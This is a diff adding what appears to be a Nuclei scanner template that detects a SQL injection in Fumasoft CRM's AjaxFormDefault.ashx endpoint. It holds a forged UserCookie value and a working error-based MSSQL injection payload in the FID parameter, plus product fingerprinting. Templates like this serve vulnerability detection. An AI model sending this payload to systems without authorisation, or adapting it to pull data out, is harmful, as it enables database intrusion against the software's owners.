@@ -1,0 +1,53 @@
+id: poc-yaml-fumasoft-ajaxformdefault-ashx-sqli
+info:
+  name: Fumasoft AjaxFormDefault.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Fumasoft CRM
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "孚盟云"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxFormDefault.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=getEditProductPic2&FID='-1/sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "FumaCRM"
+          - "0x{{t2}}"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: status
+        status:
+          - 500
